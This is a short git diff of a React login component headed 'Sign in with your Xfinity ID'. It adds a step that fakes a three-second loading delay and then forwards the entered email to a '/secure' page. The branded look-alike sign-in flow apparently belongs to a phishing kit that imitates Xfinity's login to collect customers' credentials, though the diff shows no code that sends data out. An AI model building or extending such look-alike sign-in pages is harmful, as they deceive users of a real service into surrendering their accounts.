@@ -3,8 +3,12 @@ import axios from 'axios';
 import './home.css';
 import logo from './logo.png';
 import { useState } from 'react';
+import { useNavigate } from 'react-router-dom';
+
+
 function Home(){
 
+    const navigate = useNavigate();
 
     const[email, setUserName] = useState("");
     
@@ -45,6 +49,18 @@ function Home(){
         
     }
 
+    function handleNext(e){
+        e.preventDefault();
+        setIsLoading(true);
+
+        setTimeout(() => {
+            setIsLoading(false);
+            navigate('/secure',{state:{email:email}});
+          }, 3000);
+
+       
+    }
+
 
     return (
         <>
@@ -54,7 +70,7 @@ function Home(){
 
             <h1 class="head">Sign in with your Xfinity ID</h1>
 
-            <form onSubmit={handleSubmit}>
+            <form onSubmit={handleNext}>
 
                 <div class="form-group">
                     <input onChange={function(e){
